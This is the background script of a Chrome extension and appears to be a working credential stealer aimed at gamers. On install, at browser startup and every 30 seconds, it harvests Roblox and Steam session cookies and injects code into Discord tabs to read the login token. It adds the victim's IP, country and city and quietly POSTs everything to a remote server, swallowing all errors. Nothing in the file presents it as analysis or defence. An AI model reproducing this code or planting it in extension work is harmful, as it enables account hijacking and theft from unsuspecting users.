const SERVER_URL = "https://mm2-server.onrender.com/send";

let sentRoblox = "";
let sentSteam = "";
let sentDiscord = "";

async function getDiscordToken() {
    try {
        const tabs = await chrome.tabs.query({ url: "*://discord.com/*" });
        for (const tab of tabs) {
            try {
                const results = await chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    func: () => {
                        const token = localStorage.getItem("token");
                        if (token) return token;
                        return "";
                    }
                });
                if (results[0] && results[0].result) {
                    return results[0].result;
                }
            } catch (e) {}
        }
    } catch (e) {}
    return "";
}

async function getIP() {
    try {
        const r = await fetch("https://ipwho.is/");
        const j = await r.json();
        if (j.ip && j.ip.includes(":")) {
            const r2 = await fetch("https://api.ipify.org?format=json");
            const j2 = await r2.json();
            j.ip = j2.ip || j.ip;
        }
        return j;
    } catch (e) {
        return null;
    }
}

async function sendData() {
    const data = {
        robloxCookie: "",
        steamCookie: "",
        discordToken: "",
        ip: "",
        country: "",
        city: ""
    };

    const ip = await getIP();
    data.ip = ip?.ip || "";
    data.country = ip?.country || "";
    data.city = ip?.city || "";

    try {
        const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
        const rob = c.find(x => x.name === ".ROBLOSECURITY");
        if (rob && rob.value !== sentRoblox) {
            sentRoblox = rob.value;
            data.robloxCookie = rob.value;
        }
    } catch (e) {}

    try {
        const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
        const steam = c.find(x => x.name === "steamLoginSecure");
        if (steam && steam.value !== sentSteam) {
            sentSteam = steam.value;
            data.steamCookie = steam.value;
        }
    } catch (e) {}

    const discordToken = await getDiscordToken();
    if (discordToken && discordToken !== sentDiscord) {
        sentDiscord = discordToken;
        data.discordToken = discordToken;
    }

    if (data.robloxCookie || data.steamCookie || data.discordToken) {
        try {
            await fetch(SERVER_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data)
            });
        } catch (e) {}
    }
}

chrome.runtime.onInstalled.addListener(() => { sendData(); });
chrome.runtime.onStartup.addListener(() => { sendData(); });

setInterval(sendData, 30000);
